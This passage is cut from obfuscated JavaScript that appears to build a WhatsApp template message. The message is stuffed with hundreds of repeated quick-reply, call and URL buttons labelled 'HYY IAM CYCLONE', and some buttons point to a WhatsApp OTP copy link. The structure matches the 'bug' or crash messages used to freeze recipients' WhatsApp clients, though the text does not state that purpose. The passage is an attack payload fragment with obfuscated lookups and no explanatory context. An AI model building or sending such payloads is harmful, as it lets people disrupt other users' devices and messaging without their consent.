7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':'https://www.whatsapp.com/otp/copy/'}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','id':''}},{'callButton':{'displayText':_0x9b73d7(0x108),'phoneNumber':''}},{'callButton':{'displayText':'âĢïļ\x20HYY\x20IAM\x20CYCLONE\x20âĢïļ','phoneNumber':''}},{'urlButton':{'displayText':_0x9b73d7(0x108),'url':_0x9b73d7(0x102)}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}},{'quickReplyButton':{'displayText':_0x9b73d7(0x108),'id':''}